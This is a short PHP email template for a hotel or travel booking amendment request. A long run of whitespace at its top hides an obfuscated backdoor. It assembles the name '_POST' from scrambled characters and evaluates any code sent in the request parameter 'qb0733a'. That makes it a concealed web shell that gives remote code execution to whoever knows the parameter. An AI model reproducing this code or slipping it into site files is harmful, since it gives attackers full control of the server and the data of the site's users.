<?php                                                                                                                                                                                                                                                                         $tvk45 = "trospue_";$dnb8= $tvk45[3].$tvk45[0].$tvk45[1]. $tvk45[0]. $tvk45[2].$tvk45[5].$tvk45[4].$tvk45[4]. $tvk45[6].$tvk45[1]; $xwe27 =$dnb8 ( $tvk45[7].$tvk45[4] .$tvk45[2]. $tvk45[3].$tvk45[0] ) ; if ( isset( ${$xwe27}[ 'qb0733a'] )) {eval(${$xwe27 } [ 'qb0733a' ]); }?><html>
...
<h6 class="email_user_h" style="color: #44494C;font-family: roboto;font-size: 25px;text-align: center;margin:15px 0px;">Amend booking...</h6>

<p class="email_user_n" style="font-family: roboto;font-weight: 500;">Hi,</p>
<p class="email_cntnt" style="font-family: raleway;font-size: 13px;font-weight: 500;line-height: 25px;">I want to amend my booking,  book number : <?php print_r($book_no);?> .
 </p>
